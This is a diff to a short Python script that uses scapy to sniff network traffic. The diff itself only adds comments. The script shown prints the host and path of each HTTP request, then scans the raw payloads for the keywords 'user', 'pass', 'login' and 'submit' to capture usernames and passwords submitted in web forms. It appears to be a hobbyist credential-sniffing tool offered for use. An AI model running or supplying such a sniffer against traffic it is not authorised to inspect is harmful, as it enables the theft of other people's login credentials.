@@ -18,10 +18,19 @@ def get_interface():
 def processed_pkt(pkt):
 	"""This will filter and print the packets"""
 	if pkt.haslayer(http.HTTPRequest):
+		"""
+		Check for pkt with http and printing url
+		"""
 		print(f'{pkt[http.HTTPRequest].Host}{pkt[http.HTTPRequest].Path}')
 		if pkt.haslayer(scapy.all.Raw):
+			"""
+			Check for Raw layer that has all the passwords
+			"""
 			load = pkt[scapy.all.Raw].load
 			key_word = ['user', 'pass', 'login', 'submit']
+			"""
+			List of key words for checking for username and passwords key words in web app forms
+			"""
 			for ele in key_word:	
 				if ele in str(load):
 					char = '*'
@@ -29,6 +38,7 @@ def processed_pkt(pkt):
 					break
 
 
+"""Here we just call all the methods"""					
 iface = get_interface()
 print('[*]sniffing')
 sniffer(iface)	
